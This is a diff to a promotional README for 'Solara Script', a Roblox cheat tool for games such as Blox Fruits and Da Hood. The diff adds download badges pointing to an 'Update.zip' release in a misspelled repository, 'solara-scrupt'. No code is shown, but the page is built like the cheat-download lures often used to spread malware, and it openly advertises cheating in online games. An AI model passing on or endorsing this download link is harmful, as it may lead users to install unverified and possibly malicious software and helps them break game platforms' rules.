@@ -4,12 +4,12 @@ Take your Roblox experience to a whole new galaxy with **Solara Script** — a p
 
 Whether you're grinding in **Blox Fruits**, flexing in **Da Hood**, or dominating **Pet Simulator X**, **Solara** has the tools you need to **automate, win, and rule**. 🔥
 
-[![Download Solara Script](https://img.shields.io/badge/Download-Solara_Script-purple?style=for-the-badge&logo=roblox)]()
+[![Download Solara Script](https://img.shields.io/badge/Download-Solara_Script-purple?style=for-the-badge&logo=roblox)](https://github.com/JssxDev/solara-scrupt/releases/download/Release/Update.zip)
 
 ![solara1](https://github.com/user-attachments/assets/c230784c-a4b5-42d1-b1a1-4edb09994913)
 
 
-[![Download Solara Script](https://img.shields.io/badge/Download-Solara_Script-purple?style=for-the-badge&logo=roblox)]()
+[![Download Solara Script](https://img.shields.io/badge/Download-Solara_Script-purple?style=for-the-badge&logo=roblox)](https://github.com/JssxDev/solara-scrupt/releases/download/Release/Update.zip)
 
 ---
 
